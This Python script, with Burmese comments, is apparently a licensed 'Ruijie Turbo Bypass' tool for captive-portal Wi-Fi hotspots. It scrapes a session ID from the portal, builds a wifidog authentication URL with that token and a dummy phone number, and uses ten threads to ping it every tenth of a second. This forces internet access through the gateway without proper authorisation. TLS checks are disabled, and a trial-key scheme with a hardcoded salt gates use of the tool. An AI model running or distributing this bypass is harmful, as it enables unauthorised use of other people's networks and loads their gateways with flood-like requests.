import requests
import re
import urllib3
import time
import threading
import hashlib
import os
import uuid
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urljoin

# Error message များ မပြစေရန်
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- SETTINGS ---
PING_THREADS = 10
PING_INTERVAL = 0.1 
SECRET_SALT = "FIXED_SALT_999" 
LICENSE_FILE = "license.txt"

def get_device_id():
    """Device ID ထုတ်ယူခြင်း"""
    try:
        if os.path.exists("/proc/cpuinfo"):
            with open("/proc/cpuinfo", "r") as f:
                data = f.read()
                return hashlib.md5(data.encode()).hexdigest()[:12].upper()
        return hashlib.md5(str(uuid.getnode()).encode()).hexdigest()[:12].upper()
    except:
        return "DEV-FIXED-ID"

def get_online_time():
    """Online မှ လက်ရှိအချိန် (နာရီ/မိနစ်) ကို ယူခြင်း"""
    try:
        # WorldTimeAPI မှ အချိန်ယူခြင်း
        r = requests.get("http://worldtimeapi.org/api/timezone/Asia/Yangon", timeout=5)
        if r.status_code == 200:
            dt_str = r.json()['datetime'] # e.g., 2024-05-15T14:30:05
            return datetime.strptime(dt_str[:16], "%Y-%m-%dT%H:%M")
    except:
        # Backup: Google Header မှ အချိန်ယူခြင်း
        try:
            r = requests.head("https://www.google.com", timeout=5)
            date_str = r.headers['Date']
            # GMT ကို local time ပြောင်းရန် (ဥပမာ မြန်မာစံတော်ချိန် +6:30)
            return datetime.strptime(date_str, '%a, %d %b %Y %H:%M:%S %Z')
        except:
            return None

def verify_license(device_id, user_key):
    """Trial Key နှင့် ကျန်ရှိချိန်ကို စစ်ဆေးခြင်း"""
    try:
        if "-" not in user_key: return False, "Invalid Key Format"
        
        # Key ခွဲထုတ်ခြင်း (HASH-YYYY-MM-DD HH:MM)
        parts = user_key.split("-")
        hash_part = parts[0]
        time_part = "-".join(parts[1:]) 
        
        # 1. Integrity Check
        check_str = device_id + SECRET_SALT + time_part
        correct_hash = hashlib.sha256(check_str.encode()).hexdigest()[:12].upper()
        
        if hash_part != correct_hash:
            return False, "Invalid Activation Key"
            
        # 2. Expiry Check
        now_time = get_online_time()
        if not now_time:
            return False, "Internet connection required for time verification"
            
        expiry_time = datetime.strptime(time_part, "%Y-%m-%d %H:%M")
        
        if now_time > expiry_time:
            return False, f"Trial Expired at {time_part}"
            
        remaining = expiry_time - now_time
        mins_left = int(remaining.total_seconds() / 60)
        return True, f"{mins_left} minutes remaining"
        
    except:
        return False, "Verification Error"

def check_real_internet():
    """Internet Access စစ်ဆေးခြင်း"""
    try:
        return requests.get("http://www.google.com", timeout=3).status_code == 200
    except:
        return False

def high_speed_ping(auth_link, session, sid):
    """Portal Bypass Ping လုပ်ခြင်း"""
    while True:
        try:
            session.get(auth_link, timeout=5)
            print(f"[{time.strftime('%H:%M:%S')}] Pinging SID: {sid} (Status: OK)   ", end='\r')
        except:
            break
        time.sleep(PING_INTERVAL)

def start_process():
    device_id = get_device_id()
    print(f"\n==============================")
    print(f"   RUIJIE TURBO BYPASS v2 (TRIAL)")
    print(f"==============================")
    print(f"DEVICE ID: {device_id}")

    # ၁။ License စစ်ဆေးခြင်း
    if os.path.exists(LICENSE_FILE):
        with open(LICENSE_FILE, "r") as f:
            saved_key = f.read().strip()
        
        is_valid, msg = verify_license(device_id, saved_key)
        if is_valid:
            print(f"[+] License Status: {msg}")
        else:
            print(f"[!] {msg}")
            if os.path.exists(LICENSE_FILE): os.remove(LICENSE_FILE)
            return
    else:
        # ၂။ License အသစ်တောင်းခြင်း
        user_key = input("Enter Trial/Activation Key: ").strip()
        is_valid, msg = verify_license(device_id, user_key)
        
        if is_valid:
            with open(LICENSE_FILE, "w") as f:
                f.write(user_key)
            print(f"[+] Activation Success! {msg}")
        else:
            print(f"[!] {msg}")
            return

    # ၃။ Bypass Logic
    print(f"[*] Initializing Bypass Logic...")
    while True:
        session = requests.Session()
        test_url = "http://connectivitycheck.gstatic.com/generate_204"
        try:
            r = requests.get(test_url, allow_redirects=True, timeout=5)
            if r.url == test_url:
                if check_real_internet():
                    print(f"[{time.strftime('%H:%M:%S')}] Internet OK. Waiting...           ", end='\r')
                    time.sleep(5)
                    continue
            
            portal_url = r.url
            parsed_portal = urlparse(portal_url)
            
            r1 = session.get(portal_url, verify=False, timeout=10)
            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
            r2 = session.get(next_url, verify=False, timeout=10)
            
            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
            if not sid:
                sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
                sid = sid_match.group(1) if sid_match else None
            
            if sid:
                params = parse_qs(parsed_portal.query)
                gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
                gw_port = params.get('gw_port', ['2060'])[0]
                auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"

                print(f"[*] SID: {sid} | Starting {PING_THREADS} Turbo Threads...")
                for _ in range(PING_THREADS):
                    threading.Thread(target=high_speed_ping, args=(auth_link, session, sid), daemon=True).start()

                while True:
                    time.sleep(5)
                    if check_real_internet(): break
        except:
            time.sleep(5)

if __name__ == "__main__":
    start_process()
